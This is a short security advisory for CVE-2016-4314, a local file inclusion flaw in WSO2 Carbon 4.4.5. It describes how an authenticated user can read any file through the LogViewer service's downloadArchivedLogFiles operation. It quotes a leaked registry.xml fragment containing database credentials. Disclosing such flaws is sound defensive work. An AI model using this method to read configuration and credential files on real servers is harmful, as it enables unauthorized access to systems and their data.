Product:
====================
Ws02Carbon v4.4.5
 
WSO2 Carbon is the core platform on which WSO2 middleware products are
built. It is based on Java OSGi technology, which allows
components to be dynamically installed, started, stopped, updated, and
uninstalled, and it eliminates component version conflicts.
In Carbon, this capability translates into a solid core of common
middleware enterprise components, including clustering, security,
logging, and monitoring, plus the ability to add components for specific
features needed to solve a specific enterprise scenario.
 
 
Vulnerability Type:
=========================
Local File Inclusion (LFI)
 
 
CVE Reference:
==============
CVE-2016-4314
 
 
Vulnerability Details:
=====================
 
An authenticated user can download configuration files in the filesystem
via downloadArchivedLogFiles operation in LogViewer admin service.
The request to the admin service accepts a file path relative to the carbon
log file directory (i.e. <WSO2_PRODUCT_HOME>/repository/logs)
hence can access any file in the file system.

Example: accessing the registry.xml file via Local File Inclusion exposes
the MySQL passwords.

<userName>regadmin</userName>
<password>regadmin</password>
<driverName>com.mysql.jdbc.Driver</driverName>
<maxActive>80</maxActive>
<maxWait>6000</maxWait>
<minIdle>5</minIdle>
</dbConfig>
